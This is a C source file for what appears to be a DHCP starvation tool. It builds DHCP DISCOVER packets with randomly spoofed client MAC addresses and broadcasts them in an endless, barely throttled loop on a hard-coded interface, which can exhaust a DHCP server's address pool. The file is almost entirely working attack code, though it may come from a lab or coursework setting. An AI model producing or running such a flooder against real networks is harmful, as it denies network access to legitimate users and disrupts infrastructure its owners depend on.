#define _GNU_SOURCE  // needed for SO_BINDTODEVICE
#include<stdio.h>
#include<sys/ioctl.h> 
#include<sys/socket.h>
#include<net/if.h> 
#include<netinet/in.h>
#include<arpa/inet.h>
#include<sys/types.h>
#include<stdlib.h>
#include<unistd.h> 
#include<stdint.h>
#include<string.h>

//typedef unsigned char u_char;

#include "DHCPstarve.h"


/*
DHCP
Client - DISCOVER
Server - OFFER
Client - REQUEST 
Server - ACK
*/


int debug = 1;


char interface[] = "enp0s3";

//Will be stored in dhcp struct as u_char dp_chaddr[16];
uint8_t client_hardware_address_nonpointer[16] = "";
uint8_t *client_hardware_address = client_hardware_address_nonpointer;
// uint8_t

int main(int argc, char *argv[])
{
	// UDP socket for communication
	int sockfd = create_socket();
	if (sockfd < 0) {
		printf("error socket\n");
	};

	//

    //DHCP starvation start
	send_packets(sockfd);
    return 0;
};



// creates socket, binds it to address and interface 
int create_socket() {

	//Socket creation to get in touch with the DHCP and bind an address
	int sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
    // AF_INET - IPv4
    // SOCK_DGRAM - datagram of UDP
    // IPPROTO_UDP - UDP

    //UDP port 67 - DHCP server
    //UDP port 68 - DHCP client

	struct sockaddr_in src;
	memset(&src, 0, sizeof(src));
    src.sin_port = htons(DHCP_CLIENT_PORT);
	src.sin_family = AF_INET; // ipv4
	src.sin_addr.s_addr = INADDR_ANY; //all interfaces to listen 0.0.0.0

	int flag = 1;
	setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,(char *)&flag,sizeof(flag));
	setsockopt(sockfd,SOL_SOCKET,SO_BROADCAST,(char *)&flag,sizeof(flag)); // dhcp discovery broadcast packet


    // https://man7.org/linux/man-pages/man7/netdevice.7.html
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), interface);

    //ioctl(sockfd,SIOCGIFHWADDR,&ifr);
	memcpy(client_hardware_address,&ifr.ifr_hwaddr.sa_data,6); //Copy the client hardware address of interface

    // to set interface for socket
	if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (char *)&ifr, sizeof(ifr)) < 0) {
		printf("error bind");
	};


	bind(sockfd, (struct sockaddr *) &src, sizeof(struct sockaddr));
	return sockfd;
};




// creates DHCP discover packet
int dhcp_discover(int sockfd) {
	//FIRST STEP : SEND DHCP DISCOVERY MESSAGE --> BROADCAST

    
	// https://www.scribd.com/doc/93647620/Dhcp-Header
	struct dhcp_packet discovery_packet;
	memset(&discovery_packet, 0, sizeof(discovery_packet));

    // Operation code
    // 1 request
    // 2 reply
	discovery_packet.op = 1; 
    // hardware type
    // 1 ethernet
	discovery_packet.htype = 1;
    // mac len
	discovery_packet.hlen = 6;
    //gateway hops
	discovery_packet.hops = 0;
    //transaction id, can be random
    // to match DISCOVER, OFFER, REQUEST, ACK
	discovery_packet.xid = htonl(rand()); 

    // does not matter much,
	//discovery_packet.dp_secs = htons(0);


    // https://datatracker.ietf.org/doc/html/rfc2131#section-4.1
    // first bit is the broadcast bit
    // 1000000000000000
	discovery_packet.flags = htons(32768);

    /*
    Type
    Length
    Value
    */
    // Magic cookie
	discovery_packet.options[0] = '\x63';
	discovery_packet.options[1] = '\x82';
	discovery_packet.options[2] = '\x53';
	discovery_packet.options[3] = '\x63';

	// https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml

    // DHCP message type 
	discovery_packet.options[4] = 53;    
    // option len in bytes
	discovery_packet.options[5] = '\x01';  
    // message type in bytes
    // 1 dhcp discovery
	discovery_packet.options[6] = 1; 
									

	//Random MAC for each packet

    // static AA for packets so i know which are mine
	discovery_packet.chaddr[0] = 0xAA;
	discovery_packet.chaddr[1] = 0xAA; 
	for (int i = 2; i < 6 ; i++) {
		discovery_packet.chaddr[i] = rand()%256; // 0-255 value
	};

    //Destination address 
	struct sockaddr_in dest_broadcast; 
	memset(&dest_broadcast,0,sizeof(dest_broadcast));
	dest_broadcast.sin_family = AF_INET;
	dest_broadcast.sin_port = htons(DHCP_SERVER_PORT);

    //255.255.255.255, no IP is given yet so broadcast
	dest_broadcast.sin_addr.s_addr = INADDR_BROADCAST; 


    // UDP sent to source port 68 and destination port 67
	int sent_size = sendto(sockfd, (char *)&discovery_packet, sizeof(discovery_packet), 0,(struct sockaddr *) &dest_broadcast,sizeof(dest_broadcast));
	if (sent_size < 0) {
		return 1;
	};

	if (debug) print_packet(discovery_packet);
	printf("[Discovery Packet] Succesfully sent size : %d\n", sent_size);
	return 0;
};


int check_response(int sockfd) {
	struct dhcp_packet offer_packet;
	struct sockaddr_in from; 
	memset(&from,0,sizeof(from));
	socklen_t fromlen = sizeof(struct sockaddr);

	int wrong_offer = 1;
	while (wrong_offer) {
		int received_size = recvfrom(sockfd, &offer_packet, sizeof(offer_packet), 0, (struct sockaddr*) &from, &fromlen);

		if (debug) print_packet(offer_packet);

		//check if this is and offer
		if (offer_packet.options[4] != 53 || offer_packet.options[6] != 2) {
			continue;
		};

		//check if offer is for us
        // check client MAC 
		wrong_offer = 0;
		for (int i = 0; i < 6; i++) {
			if (offer_packet.chaddr[i] != client_hardware_address[i]) {
				wrong_offer = 1;
			};
		};

	};
    return 0;
};

int send_packets(int sockfd) {
	int packets_sent = 1;
    printf("\n");
	while (1) {
		printf("Packets sent : %d\n", packets_sent++);
		dhcp_discover(sockfd);

        // delay so network interface does not get overwhelmed
		usleep(100);
		
		//printf("\nReceiving offer...\n");
		//receive_offer(sockfd);
	};
	return 0;
};

/*
RFC 2131
RFC 2132
*/
void print_packet(const struct dhcp_packet packet){
    printf("\n");
    printf("DHCP PACKET\n");

    printf("Operation: ");
    if(packet.op == 1)
        printf("REQUEST\n");
    else if(packet.op == 2)
        printf("REPLY\n");
    else
        printf("????? (%d)\n", packet.op);
    printf("Hardware type: %d\n", packet.htype);
    printf("Hardware length: %d bytes\n", packet.hlen);
    printf("Transaction ID: 0x%x\n",
           ntohl(packet.xid));
    printf("Flags: 0x%x\n",
           ntohs(packet.flags));
    printf("Client IP: %s\n",
           inet_ntoa(packet.ciaddr));
    printf("Assigned IP: %s\n",
           inet_ntoa(packet.yiaddr));
    printf("DHCP server IP: %s\n",
           inet_ntoa(packet.siaddr));


    printf("Client MAC: ");
    for(int i = 0; i < packet.hlen; i++)
    {
        printf("%02X", packet.chaddr[i]);

        if(i < packet.hlen-1)
            printf(":");
    }

    printf("\n");

    printf("DHCP message type: ");
    switch(packet.options[6])
    {
        case 1:
            printf("DISCOVER");
            break;

        case 2:
            printf("OFFER");
            break;

        case 3:
            printf("REQUEST");
            break;

        case 5:
            printf("ACK");
            break;

        default:
            printf("UNKNOWN");
    }

    printf("\n");
}


